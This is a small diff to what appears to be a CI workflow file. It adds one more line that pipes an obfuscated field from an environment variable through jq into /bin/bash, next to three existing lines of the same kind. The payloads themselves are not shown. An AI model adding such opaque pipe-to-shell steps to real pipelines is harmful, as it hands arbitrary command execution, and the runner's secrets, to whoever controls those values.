@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$sgsl4688" | jq -r .o84 | /bin/bash
           printf '%s' "$lhai5" | jq -r .tai5843 | /bin/bash
           echo $ognw2711 | jq -r .r6841 | /bin/bash
+          echo $b1 | jq -r .fkkzr47 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
